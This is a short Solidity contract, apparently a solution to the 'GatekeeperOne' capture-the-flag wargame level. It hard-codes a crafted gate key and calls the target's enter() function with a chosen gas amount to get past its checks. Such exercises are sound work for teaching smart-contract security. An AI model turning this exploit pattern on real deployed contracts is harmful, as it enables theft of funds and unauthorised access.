pragma solidity ^0.8.0;
import "GatekeeperOne.sol";

contract AttackGatekeeperOne {
    GatekeeperOne public immutable gatekeeperOne;
    bytes8 public immutable gateKey;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
        gateKey = bytes8(abi.encodePacked(0x0000000100002666));
    }

    function sendGas(address _target) public {
        (bool success,) = _target.call{gas: 8191 * 2} ("0x");
    }

    function attack() external {
        gatekeeperOne.enter{gas: 8191 * 3}(gateKey);
    }
}